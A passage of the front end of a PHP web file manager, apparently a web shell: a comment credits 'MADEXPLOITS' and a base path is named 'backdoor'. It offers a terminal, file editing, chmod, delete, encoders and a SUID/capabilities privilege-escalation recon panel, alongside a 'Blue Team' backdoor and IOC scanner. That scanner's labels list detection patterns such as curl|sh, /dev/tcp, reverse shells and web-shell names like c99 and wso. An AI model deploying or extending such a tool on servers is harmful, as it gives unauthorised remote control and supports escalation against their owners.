        <div class="sec-panel" data-panel="codec">
          <div class="tool-grid">
            <div class="fg"><label>Mode</label>
              <select id="secCodecMode">
                <option value="b64enc">Base64 Encode</option><option value="b64dec">Base64 Decode</option>
                <option value="urlenc">URL Encode</option><option value="urldec">URL Decode</option>
                <option value="rot13">ROT13</option><option value="hexenc">Hex Encode</option><option value="hexdec">Hex Decode</option>
              </select>
            </div>
            <div class="fg span2"><label>Input</label><textarea id="secCodecText" rows="4"></textarea></div>
          </div>
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunCodec">Transform</button></div>
          <div class="tool-output tall empty" id="secOutCodec">Encoded/decoded output.</div>
        </div>

        <div class="sec-panel" data-panel="dns">
          <div class="tool-grid">
            <div class="fg"><label>Host</label><input type="text" id="secDnsHost" placeholder="example.com"></div>
            <div class="fg"><label>Record type</label>
              <select id="secDnsType"><option value="ALL">ALL</option><option value="A">A</option><option value="AAAA">AAAA</option><option value="MX">MX</option><option value="TXT">TXT</option><option value="NS">NS</option><option value="CNAME">CNAME</option></select>
            </div>
          </div>
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunDns">Lookup DNS</button></div>
          <div class="tool-output tall empty" id="secOutDns">DNS records.</div>
        </div>

        <div class="sec-panel" data-panel="suid">
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunSuid">Find SUID/SGID/CAP</button></div>
          <p class="tool-note">Privilege escalation recon — setuid binaries, setgid, Linux capabilities.</p>
          <div class="tool-output tall empty" id="secOutSuid">Linux only.</div>
        </div>

      </div>
    </div>
    <div class="modal-foot">
      <span class="left" id="secMeta">Cyber Security toolkit</span>
      <button class="btn mc">Close</button>
    </div>
  </div>
</div>

<div class="overlay" id="mBlueHub">
  <div class="modal m-full">
    <div class="modal-head">
      <h2>🔵 Blue Team Hub</h2>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body" style="padding:0;display:flex;flex-direction:column">
      <div class="sec-tabs ip-tabs" role="tablist">
        <button class="ip-tab active" data-blue="backdoor" type="button">Backdoor Scan</button>
        <button class="ip-tab" data-blue="fullaudit" type="button">Full Audit</button>
        <button class="ip-tab" data-blue="recent" type="button">Recent Changes</button>
        <button class="ip-tab" data-blue="writable" type="button">Writable</button>
        <button class="ip-tab" data-blue="hidden" type="button">Hidden Files</button>
        <button class="ip-tab" data-blue="cron" type="button">Cron Audit</button>
        <button class="ip-tab" data-blue="logs" type="button">Log Audit</button>
        <button class="ip-tab" data-blue="ioc" type="button">IOC Hunt</button>
        <button class="ip-tab" data-blue="process" type="button">Processes</button>
      </div>
      <div style="padding:16px;overflow:auto;flex:1">

        <div class="sec-panel active" data-bpanel="backdoor">
          <div class="tool-grid">
            <div class="fg span2"><label>Scan path (optional)</label><input type="text" id="blueScanPath" placeholder="Document root + /var/www /home /tmp /opt"></div>
            <div class="fg span2"><label style="display:flex;align-items:center;gap:8px;cursor:pointer"><input type="checkbox" id="blueAggressive" checked style="width:auto"> Aggressive mode (8000 files · depth 14 · lower threshold · polyglot scan)</label></div>
          </div>
          <div class="sec-actions">
            <button class="btn btn-primary btn-sm" id="blueRunBackdoor">Scan for Backdoors</button>
            <button class="btn btn-ghost btn-sm" id="blueCopyBackdoor">Copy Report</button>
          </div>
          <p class="tool-note">Scoring: CRITICAL ≥50 · HIGH ≥30 · MEDIUM ≥15 · LOW ≥6 (aggressive). Review before quarantine — false positives possible on legit apps.</p>
          <div class="tool-output tall empty" id="blueOutBackdoor">Ready to scan.</div>
          <div class="blue-threat-actions" id="blueThreatActions">
            <span style="font-size:11px;color:var(--tx3)" id="blueThreatCount">0 threats</span>
            <button class="btn btn-ghost btn-sm" id="blueSelectAll">Select All</button>
            <button class="btn btn-ghost btn-sm" id="blueSelectNone">Deselect All</button>
            <button class="btn btn-danger btn-sm" id="blueDeleteSelected">Quarantine Selected</button>
            <button class="btn btn-danger btn-sm" id="blueDeleteAll">Quarantine All</button>
            <button class="btn btn-ghost btn-sm" id="blueKeepAll">Keep All (Dismiss)</button>
          </div>
          <div class="blue-threat-wrap hidden" id="blueThreatList"></div>

          <div style="margin-top:18px;padding-top:14px;border-top:1px solid var(--bd2)">
            <div class="sec-actions" style="margin-bottom:8px">
              <strong style="font-size:12px;color:var(--tx2)">📦 Quarantine (tmp)</strong>
              <button class="btn btn-ghost btn-sm" id="blueRefreshQuarantine">Refresh</button>
              <button class="btn btn-primary btn-sm" id="blueRestoreSelected">Restore Selected</button>
              <button class="btn btn-primary btn-sm" id="blueRestoreAll">Restore All</button>
            </div>
            <p class="tool-note" id="blueQuarantineDir">Removed files are moved to system tmp — restore anytime.</p>
            <div class="blue-threat-wrap" id="blueQuarantineList"><div class="blue-threat-item" style="color:var(--tx4);font-style:italic">No quarantined files.</div></div>
          </div>
        </div>

        <div class="sec-panel" data-bpanel="fullaudit">
          <div class="tool-grid">
            <div class="fg span2"><label>Scan path (optional)</label><input type="text" id="blueAuditPath" placeholder="Same as backdoor scan scope"></div>
          </div>
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunFullAudit">Run Full Audit</button></div>
          <p class="tool-note">Runs: backdoor scan, recent changes, writable files, hidden scripts, cron audit, IOC hunt, suspicious processes, log audit.</p>
          <div class="tool-output tall empty" id="blueOutFullAudit">Comprehensive blue team assessment (may take several minutes).</div>
        </div>

        <div class="sec-panel" data-bpanel="recent">
          <div class="tool-grid">
            <div class="fg"><label>Days</label><input type="number" id="blueRecentDays" value="7" min="1" max="90"></div>
            <div class="fg"><label>Path (optional)</label><input type="text" id="blueRecentPath" placeholder="Web root"></div>
          </div>
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunRecent">Find Recent Changes</button></div>
          <div class="tool-output tall empty" id="blueOutRecent">Recently modified PHP/JS/.htaccess files.</div>
        </div>

        <div class="sec-panel" data-bpanel="writable">
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunWritable">Scan Writable Files</button></div>
          <div class="tool-output tall empty" id="blueOutWritable">World-writable files &amp; directories (777 / o+w).</div>
        </div>

        <div class="sec-panel" data-bpanel="hidden">
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunHidden">Scan Hidden Scripts</button></div>
          <div class="tool-output tall empty" id="blueOutHidden">Dot-files: .htaccess, .user.ini, hidden PHP shells.</div>
        </div>

        <div class="sec-panel" data-bpanel="cron">
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunCron">Audit Cron Jobs</button></div>
          <div class="tool-output tall empty" id="blueOutCron">Detects persistence: curl|sh, /dev/tcp, reverse shells, base64 decode…</div>
        </div>

        <div class="sec-panel" data-bpanel="logs">
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunLogs">Audit Logs</button></div>
          <div class="tool-output tall empty" id="blueOutLogs">Failed auth, sudo usage, suspicious web server errors.</div>
        </div>

        <div class="sec-panel" data-bpanel="ioc">
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunIoc">Hunt IOC Filenames</button></div>
          <div class="tool-output tall empty" id="blueOutIoc">Known malicious filenames: c99, r57, wso, b374k, alfa…</div>
        </div>

        <div class="sec-panel" data-bpanel="process">
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunProcess">Scan Processes</button></div>
          <div class="tool-output tall empty" id="blueOutProcess">nc, /dev/tcp, reverse shells, miners, scanners.</div>
        </div>

      </div>
    </div>
    <div class="modal-foot">
      <span class="left" id="blueMeta">Blue Team defensive toolkit</span>
      <button class="btn mc">Close</button>
    </div>
  </div>
</div>

<div class="overlay" id="mBlueDelete">
  <div class="modal m-sm">
    <div class="modal-head"><h2>📦 Move to Quarantine</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <p id="blueDeleteMsg" style="color:var(--tx2);font-size:14px;line-height:1.6"></p>
      <p class="tool-note" style="margin-top:10px">Files dipindah ke folder tmp (bukan dihapus permanen). Bisa di-restore kapan saja dari section Quarantine di bawah.</p>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Cancel</button>
      <button class="btn btn-danger" id="blueDeleteConfirm">Move to Quarantine</button>
    </div>
  </div>
</div>

<div class="ctx" id="ctx"></div>

<div class="bulk-bar" id="bulkBar" role="toolbar" aria-label="Bulk actions">
  <span class="bulk-count" id="bulkCount">0</span>
  <span class="bulk-label">selected</span>
  <span class="bulk-sep"></span>
  <button class="bulk-btn" id="bulkDl" title="Download selected">
    <svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z" fill="currentColor"/><path d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.5 3.5a.75.75 0 0 1-1.06 0l-3.5-3.5a.75.75 0 0 1 1.06-1.06l2.678 2.33Z" fill="currentColor"/></svg>
    <span>Download</span>
  </button>
  <button class="bulk-btn del" id="bulkDel" title="Delete selected">
    <svg viewBox="0 0 16 16"><path d="M6.5 1.75a.25.25 0 0 1 .25-.25h2.5a.25.25 0 0 1 .25.25V3h-3V1.75Zm4.5 0V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.748 1.748 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15Z" fill="currentColor"/></svg>
    <span>Delete</span>
  </button>
  <span class="bulk-sep"></span>
  <button class="bulk-btn close" id="bulkClose" title="Clear selection (Esc)">
    <svg viewBox="0 0 16 16"><path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.75.75 0 1 1 1.06 1.06L9.06 8l3.22 3.22a.75.75 0 1 1-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 1 1-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z" fill="currentColor"/></svg>
  </button>
</div>

<div class="toasts" id="toasts"></div>

<script>
'use strict';
const BASE = '<?= addslashes($baseDir) ?>';
const API  = '?api=1';
const S = { path:'', entries:[], selected:new Set(), view:'list',
  createMode:'file', renameTarget:null, deleteTarget:null, chmodTarget:null, editorPath:null,
  termHistory:[], termHistIdx:-1, searchTimer:null,
  sortCol:'name', sortDir:'asc', lastClickIdx:-1, secReconLoaded:false,
  blueFindings:[], blueDeleteQueue:[], blueQuarantine:[] };

function sortEntries(arr){
  const col = S.sortCol, dir = S.sortDir==='desc' ? -1 : 1;
  return arr.slice().sort((a,b)=>{
    if(a.is_dir !== b.is_dir) return a.is_dir ? -1 : 1;
    let v;
    if(col==='size'){
      const sa = a.is_dir ? -1 : (a.size||0);
      const sb = b.is_dir ? -1 : (b.size||0);
      v = sa - sb;
    } else if(col==='modified'){
      v = (a.modified||0) - (b.modified||0);
    } else if(col==='perm'){
      v = String(a.perm||'').localeCompare(String(b.perm||''));
    } else {
      v = a.name.localeCompare(b.name, undefined, {numeric:true, sensitivity:'base'});
    }
    return v * dir;
  });
}

function setSort(col){
  if(S.sortCol === col) S.sortDir = S.sortDir==='asc' ? 'desc' : 'asc';
  else { S.sortCol = col; S.sortDir = 'asc' }
  renderList();
}

const $ = s => document.querySelector(s);
const $$ = s => [...document.querySelectorAll(s)];

// --- HELPER  BY MADEXPLOITS ---

function normalizePath(path) {
    if (!path) return '';
    if (path === '/') return '/';
    // Replace multiple slashes with single slash and remove trailing slash
    return path.replace(/\/+/g, '/').replace(/\/$/, '');
}

// ─── Icons ───────────────────────────────────────────────────────
// ─── Icon Set — Lucide-inspired, type-distinctive ────────────────
// Common file body path (used by document-style icons)
const _F_BODY = '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>';
const _F_FOLD = '<path d="M14 2v6h6z" fill-opacity=".35"/>';

const IC = {
  // Folder — solid with tab
  folder: `<svg class="fico" viewBox="0 0 24 24" fill="currentColor"><path d="M3 5a2 2 0 0 1 2-2h4.17a2 2 0 0 1 1.41.59L12 5h7a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>`,

  // Generic file — body + folded corner
  file:    `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">${_F_BODY}${_F_FOLD}</svg>`,

  // PHP — file + chevron + question stem emblem
  php:     `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".25"/>
    <path d="M14 2v6h6z" opacity=".55"/>
    <g fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
      <path d="M9 12.5l-2.5 2.5L9 17.5"/>
      <path d="M13.5 12.5c.83 0 1.5.67 1.5 1.5 0 1-1.5 1.4-1.5 2.3"/>
      <path d="M13.5 18h.01"/>
    </g>
  </svg>`,

  // JS — file + "JS" letterforms (J hook + S curve)
  js:      `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".25"/>
    <path d="M14 2v6h6z" opacity=".55"/>
    <g fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
      <path d="M10 12.5v3.5a1.5 1.5 0 0 1-3 0"/>
      <path d="M17 13.5a1.5 1.5 0 0 0-3 0c0 1.5 3 1.2 3 2.5a1.5 1.5 0 0 1-3 0"/>
    </g>
  </svg>`,

  // CSS — file + "#" hash
  css:     `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".25"/>
    <path d="M14 2v6h6z" opacity=".55"/>
    <g fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round">
      <path d="M10 12l-1.5 6"/><path d="M14 12l-1.5 6"/>
      <path d="M7 14h10"/><path d="M6.5 16h10"/>
    </g>
  </svg>`,

  // HTML — file + "</>" chevrons
  html:    `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".25"/>
    <path d="M14 2v6h6z" opacity=".55"/>
    <g fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
      <path d="M9 13l-2.5 2L9 17"/>
      <path d="M15 13l2.5 2L15 17"/>
      <path d="M13 12.5l-2 5"/>
    </g>
  </svg>`,

  // Config — gear/settings (Lucide-style)
  config:  `<svg class="fico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
    <path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/>
    <circle cx="12" cy="12" r="3"/>
  </svg>`,

  // Text — file + horizontal lines
  text:    `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".4"/>
    <path d="M14 2v6h6z" opacity=".6"/>
    <g fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round">
      <path d="M8 13h8"/><path d="M8 16h8"/><path d="M8 19h5"/>
    </g>
  </svg>`,

  // Image — picture with sun and mountain
  image:   `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <rect x="3" y="3" width="18" height="18" rx="2"/>
    <circle cx="8.5" cy="8.5" r="1.7" fill="rgba(0,0,0,.4)"/>
    <path d="M21 15l-3.86-3.86a2 2 0 0 0-2.83 0L8 17.31l-2.17-2.17a2 2 0 0 0-2.83 0L3 15.31V20a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1z" fill="rgba(0,0,0,.4)"/>
  </svg>`,

  // Archive — package box with tape
  archive: `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M2 4a1 1 0 0 1 1-1h18a1 1 0 0 1 1 1v3a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1z" opacity=".7"/>
    <path d="M3 8v12a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1V8z"/>
    <path d="M10 13h4v3h-4z" fill="rgba(0,0,0,.4)"/>
  </svg>`,

  // Database — stacked cylinders
  database:`<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <ellipse cx="12" cy="5" rx="9" ry="3"/>
    <path d="M3 5v6c0 1.66 4.03 3 9 3s9-1.34 9-3V5" opacity=".7"/>
    <path d="M3 11v6c0 1.66 4.03 3 9 3s9-1.34 9-3v-6" opacity=".5"/>
  </svg>`,
};
const ico = t => `<span class="ico-wrap">${IC[t]||IC.file}</span>`;

// ─── Utils ───────────────────────────────────────────────────────
const esc = s => { const d=document.createElement('div'); d.textContent=s; return d.innerHTML };
const fmtBytes = b => {
  if(b==null)return'—';if(b<1024)return b+' B';
  const u=['KB','MB','GB'];let v=b/1024;
  for(const x of u){if(v<1024)return(v>=100?v.toFixed(0):v.toFixed(1))+' '+x;v/=1024}
  return v.toFixed(1)+' TB';
};
const fmtDate = ts => new Date(ts*1000).toLocaleString('en-US',{month:'short',day:'numeric',year:'numeric',hour:'2-digit',minute:'2-digit'});
const fmtRelTime = ts => {
  if(!ts) return '—';
  const now = Date.now()/1000;
  const diff = now - ts;
  if(diff < 5) return 'just now';
  if(diff < 60) return Math.floor(diff)+'s ago';
  if(diff < 3600) return Math.floor(diff/60)+'m ago';
  if(diff < 86400) return Math.floor(diff/3600)+'h ago';
  if(diff < 172800) return 'Yesterday';
  if(diff < 604800) return Math.floor(diff/86400)+'d ago';
  const d = new Date(ts*1000);
  const m = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  if(diff < 31536000) return m[d.getMonth()]+' '+d.getDate();
  return m[d.getMonth()]+' '+d.getDate()+' \''+String(d.getFullYear()).slice(-2);
};
const getExt = name => {
  if(!name) return '';
  const i = name.lastIndexOf('.');
  return (i>0 && i<name.length-1) ? name.substring(i+1).toUpperCase() : '';
};

function permClass(perm){
  if(!perm) return '';
  const s = String(perm).slice(-3);
  if(s.length !== 3 || !/^\d{3}$/.test(s)) return '';
  const owner = +s[0], world = +s[2];
  let cls;
  if(owner & 2){
    cls = (owner & 1) ? 'perm-ok-x' : 'perm-ok';
  } else {
    cls = 'perm-locked';
  }
  return cls;
}
function permSymbolic(perm){
  if(!perm) return '';
  const s = String(perm).slice(-3);
  if(s.length !== 3 || !/^\d{3}$/.test(s)) return '';
  let r = '';
  for(const d of s){
    const n = +d;
    r += (n&4?'r':'-') + (n&2?'w':'-') + (n&1?'x':'-');
  }
  return r;
}
function permLabel(perm){
  if(!perm) return '';
  const s = String(perm).slice(-3);
  if(s.length !== 3 || !/^\d{3}$/.test(s)) return '';
  const owner = +s[0], world = +s[2];
  const writable = !!(owner & 2);
  const exec = !!(owner & 1);
  const pub = !!(world & 2);
  let lbl = writable ? (exec ? 'Writable + executable' : 'Writable') : 'Read-only · locked';
  if(pub) lbl += ' · world-writable';
  return lbl;
}
const joinPath = (a,b) => {
  if(!a) return b;
  if(!b) return a;
  // Handle Windows drive paths
  if(a.match(/^[A-Za-z]:[\/\\]?$/)) {
    return a + '/' + b;
  }
  return a + '/' + b;
};
const itemPath = n => {
    if (!n) return S.path;
    
    // Handle absolute Linux path
    if (S.path && S.path.startsWith('/')) {
        let base = S.path;
        // Ensure base ends with slash for joining
        if (!base.endsWith('/')) {
            base = base + '/';
        }
        let joined = base + n;
        // Clean up double slashes
        return joined.replace(/\/+/g, '/');
    }
    
    return joinPath(S.path, n);
};

// ─── API ─────────────────────────────────────────────────────────
async function api(action,data={},isForm=false){
  const opts={method:'POST'};
  if(isForm){opts.body=data}else{opts.headers={'Content-Type':'application/json'};opts.body=JSON.stringify({action,...data});}
  const r=await fetch(API,opts);
  return r.json();
}

// ─── Toast ───────────────────────────────────────────────────────
function toast(msg,type='ok'){
  const el=document.createElement('div');
  el.className='toast '+(type==='error'?'err':'ok');
  el.innerHTML=`<div class="t-dot"></div>${esc(msg)}`;
  $('#toasts').appendChild(el);
  setTimeout(()=>{
    el.style.transition='opacity .25s, transform .25s';
    el.style.opacity='0'; el.style.transform='translateX(20px)';
    setTimeout(()=>el.remove(),260);
  },3000);
}

// ─── Modal ───────────────────────────────────────────────────────
const openM  = id => $(id).classList.add('open');
const closeM = id => $(id).classList.remove('open');
const closeAll = () => $$('.overlay.open').forEach(m=>m.classList.remove('open'));
$$('.mc').forEach(b=>b.addEventListener('click',closeAll));
$$('.overlay').forEach(o=>o.addEventListener('click',e=>{if(e.target===o)closeAll()}));

// ─── Breadcrumb ──────────────────────────────────────────────────
// Mengubah path apa pun (kosong, relatif, atau absolute) menjadi
// path absolute lengkap untuk ditampilkan di breadcrumb. Contoh:
//   ''                  -> 'C:/laragon/www/backdoor'
//   'subfolder'         -> 'C:/laragon/www/backdoor/subfolder'
//   'C:/Windows'        -> 'C:/Windows'
//   '/var/www'          -> '/var/www'
function toAbsolutePath(path){
    const baseNormalized = BASE.replace(/\\/g, '/').replace(/\/+$/, '');
    if (!path) return baseNormalized;
    const isWin = /^[A-Za-z]:/.test(path);
    const isLin = path.startsWith('/');
    if (isWin || isLin) return path;
    // Path relatif → gabungkan dengan BASE
    return baseNormalized + '/' + path.replace(/^\/+/, '');
}

function renderBreadcrumb(){
    const bc = $('#breadcrumb');
    bc.innerHTML = '';

    // Selalu render breadcrumb sebagai path absolute lengkap
    let currentPath = toAbsolutePath(S.path || '');

    // ── Windows absolute path (C:/laragon/www/backdoor) ──────────
    if (/^[A-Za-z]:/.test(currentPath)) {
        currentPath = currentPath.replace(/\\/g, '/');
        if (!/^[A-Za-z]:\//.test(currentPath)) {
            currentPath = currentPath.charAt(0) + ':/' + currentPath.substring(2);
        }

        const drive = currentPath.charAt(0) + ':';
        let pathAfterDrive = currentPath.substring(2).replace(/^\/+/, '').replace(/\/+$/, '');
        const segments = pathAfterDrive ? pathAfterDrive.split('/').filter(p => p !== '') : [];

        // Tombol drive (C:)
        const driveBtn = document.createElement('button');
        driveBtn.className = 'bc-btn' + (segments.length === 0 ? ' bc-cur' : '');
        driveBtn.textContent = drive;
        driveBtn.title = drive + '/';
        driveBtn.onclick = () => navigate(drive + '/');
        bc.appendChild(driveBtn);

        let accumulatedPath = drive;
        for (let i = 0; i < segments.length; i++) {
            const segment = segments[i];
            accumulatedPath += '/' + segment;

            const sep = document.createElement('span');
            sep.className = 'bc-sep';
            sep.textContent = '/';
            bc.appendChild(sep);

            const btn = document.createElement('button');
            btn.className = 'bc-btn' + (i === segments.length - 1 ? ' bc-cur' : '');
            btn.textContent = segment;
            btn.title = accumulatedPath + '/';
            const targetPath = accumulatedPath + '/';
            btn.onclick = ((p) => () => navigate(p))(targetPath);
            bc.appendChild(btn);
        }
    }
    // ── Linux absolute path (/var/www/html) ──────────────────────
    else if (currentPath.startsWith('/')) {
        let cleanPath = currentPath;
        if (cleanPath !== '/' && cleanPath.endsWith('/')) cleanPath = cleanPath.slice(0, -1);
        const segments = cleanPath.split('/').filter(s => s !== '');

        // Tombol root '/'
        const rootBtn = document.createElement('button');
        rootBtn.className = 'bc-btn' + (segments.length === 0 ? ' bc-cur' : '');
        rootBtn.textContent = '/';
        rootBtn.title = '/';
        rootBtn.onclick = () => navigate('/');
        bc.appendChild(rootBtn);

        let accumulatedPath = '';
        for (let i = 0; i < segments.length; i++) {
            const segment = segments[i];
            accumulatedPath += '/' + segment;

            const sep = document.createElement('span');
            sep.className = 'bc-sep';
            sep.textContent = '/';
            bc.appendChild(sep);

            const btn = document.createElement('button');
            btn.className = 'bc-btn' + (i === segments.length - 1 ? ' bc-cur' : '');
            btn.textContent = segment;
            btn.title = accumulatedPath + '/';
            const targetPath = accumulatedPath + '/';
            btn.onclick = ((p) => () => navigate(p))(targetPath);
            bc.appendChild(btn);
        }
    }

    // ── Up button visibility ─────────────────────────────────────
    let showUp = false;
    if (/^[A-Za-z]:/.test(currentPath)) {
        const afterDrive = currentPath.substring(2).replace(/^\/+/, '').replace(/\/+$/, '');
        showUp = afterDrive !== '';
    } else if (currentPath.startsWith('/')) {
        showUp = currentPath.replace(/\/+$/, '') !== '';
    }
    $('#btnUp').style.visibility = showUp ? 'visible' : 'hidden';
}

// Helper function to escape HTML
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ─── Render ──────────────────────────────────────────────────────
const SORT_ARROW = '<svg class="th-arrow" viewBox="0 0 12 12"><path d="M6 9 2 4h8z"/></svg>';
function thSort(col, label){
  const active = S.sortCol === col;
  return `<span class="th-sort${active?' active':''}${active && S.sortDir==='desc'?' desc':''}" data-sort="${col}">${label}${SORT_ARROW}</span>`;
}

function renderList(){
  const panel=$('#panel');
  if(!S.entries.length){
    panel.innerHTML=`<div class="empty"><div class="empty-ico"><svg viewBox="0 0 24 24"><path d="M3 5a2 2 0 0 1 2-2h4.17a2 2 0 0 1 1.41.59L12 5h7a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="currentColor"/></svg></div><h3>Empty folder</h3><p>Drop files here or create something new</p><button class="btn btn-primary" onclick="showCreate('file')">New File</button></div>`;
    updateBulkBar();
    return;
  }
  const sorted = sortEntries(S.entries);
  if(S.view==='grid'){
    panel.innerHTML='<div class="grid-wrap">'+sorted.map((e,i)=>{
      const p=itemPath(e.name);
      const ext = !e.is_dir ? getExt(e.name) : '';
      const selCls = S.selected.has(p) ? ' sel' : '';
      return `<div class="gcard${selCls}" style="--i:${i}" data-icon="${e.icon}" data-path="${esc(p)}" data-dir="${e.is_dir}" data-name="${esc(e.name)}" data-ed="${e.editable}" data-perm="${e.perm||''}" data-idx="${i}">
        ${ico(e.icon)}<div class="gname">${esc(e.name)}</div><div class="gsize">${e.is_dir?'Folder':fmtBytes(e.size)}${ext?` <span class="gext">${ext}</span>`:''}</div></div>`;
    }).join('')+'</div>';
    bindGridEvents();
    updateBulkBar();
    return;
  }

  const allSelected = sorted.length>0 && sorted.every(e => S.selected.has(itemPath(e.name)));
  const headChk = `<div class="chk-cell"><div class="chk-box${allSelected?' on':''}" id="chkAll" title="Select all"></div></div>`;
  const head = `<div class="tbl-head">
${headChk}
${thSort('name','Name')}
${thSort('size','Size')}
${thSort('perm','Perm')}
${thSort('modified','Modified')}
<span style="text-align:right;padding-right:4px">Actions</span>
</div>`;

  panel.innerHTML = head + `<ul class="flist">`+sorted.map((e,i)=>{
    const p=itemPath(e.name);
    const ext = !e.is_dir ? getExt(e.name) : '';
    const chip = ext ? `<span class="fname-chip">${ext}</span>` : '';
    const selCls = S.selected.has(p) ? ' sel' : '';
    const chkCls = S.selected.has(p) ? ' on' : '';
    const dateAbs = fmtDate(e.modified);
    const dateRel = fmtRelTime(e.modified);
    return `<li class="frow${selCls}" style="--i:${i}" data-icon="${e.icon}" data-path="${esc(p)}" data-dir="${e.is_dir}" data-name="${esc(e.name)}" data-ed="${e.editable}" data-perm="${e.perm||''}" data-idx="${i}">
<div class="chk-cell"><div class="chk-box${chkCls}" data-path="${esc(p)}"></div></div>
<div class="fname-cell"><div class="ico-wrap">${IC[e.icon]||IC.file}</div><div class="fname-text"><span class="fname">${esc(e.name)}</span>${chip}</div></div>
<span class="fmeta">${e.is_dir?'—':fmtBytes(e.size)}</span>
<span class="fmeta"><span class="perm ${permClass(e.perm)}" data-a="chmod" title="${e.perm||'—'}${permSymbolic(e.perm)?' · '+permSymbolic(e.perm):''}${permLabel(e.perm)?' · '+permLabel(e.perm):''}">${e.perm||'—'}</span></span>
<span class="fmeta" title="${dateAbs}">${dateRel}</span>
<div class="row-acts">
  <button class="ico-btn" data-a="open" title="Open"><svg viewBox="0 0 16 16"><path d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm9-1a1 1 0 1 1-2 0 1 1 0 0 1 2 0ZM6.5 12a1.5 1.5 0 1 1 3 0 1.5 1.5 0 0 1-3 0Z" fill="currentColor"/></svg></button>
